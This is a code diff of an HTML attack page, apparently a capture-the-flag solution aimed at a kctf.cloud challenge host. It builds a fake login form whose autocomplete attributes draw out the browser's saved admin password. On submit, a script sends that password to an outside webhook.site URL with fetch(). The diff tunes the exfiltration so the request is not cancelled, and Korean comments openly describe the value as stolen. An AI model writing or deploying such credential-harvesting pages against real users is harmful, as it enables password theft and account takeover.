@@ -6,13 +6,11 @@
 <body>
     <h1>Please wait, loading configuration...</h1>
 
-    <!-- 1. autocomplete 속성을 추가하여 브라우저를 완벽하게 속이는 폼 -->
     <form id="login-form" action="https://autofill-web.k17.kctf.cloud/login" method="POST">
         <label for="username">Username:</label>
         <input type="text" id="username" name="username" value="admin" autocomplete="username">
         <br>
         <label for="password">Password:</label>
-        <!-- (핵심) autocomplete="current-password" 추가 -->
         <input type="password" id="password" name="password" autocomplete="current-password">
         <br>
         <input type="submit" value="Sign In">
@@ -20,27 +18,23 @@
 
     <script>
         // (중요) 이 URL을 당신의 Webhook.site URL로 반드시 교체하세요!
-        const webhookUrl = '	https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
+        const webhookUrl = 'https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
         const form = document.getElementById('login-form');
 
-        // 2. (핵심) 타이머 대신 form의 'submit' 이벤트를 감지
         form.addEventListener('submit', (event) => {
-            // 폼이 실제로 제출되어 페이지가 넘어가는 것을 일단 막습니다.
+            // 1. (핵심) 폼 제출을 막아 페이지가 절대 이동하지 않도록 합니다.
             event.preventDefault();
 
             const stolenPassword = document.getElementById('password').value;
 
             if (stolenPassword) {
-                console.log("Password stolen on submit:", stolenPassword);
-                // 훔친 비밀번호를 Webhook으로 전송
-                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`)
-                  .then(() => {
-                    // 전송 후, 원래대로 폼을 제출하여 자연스럽게 보이게 할 수 있습니다.
-                    form.submit();
-                  });
+                console.log("Password stolen. Sending to webhook:", stolenPassword);
+                // 2. 훔친 비밀번호를 보내기만 하고, 더 이상 아무것도 하지 않습니다.
+                // 이렇게 하면 fetch 요청이 취소될 걱정이 없습니다.
+                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`);
             } else {
                 console.log("Submit triggered, but password field is empty.");
-                fetch(`${webhookUrl}?error=autofill_failed_on_submit`);
+                fetch(`${webhookUrl}?error=autofill_failed_final`);
             }
         });
     </script>
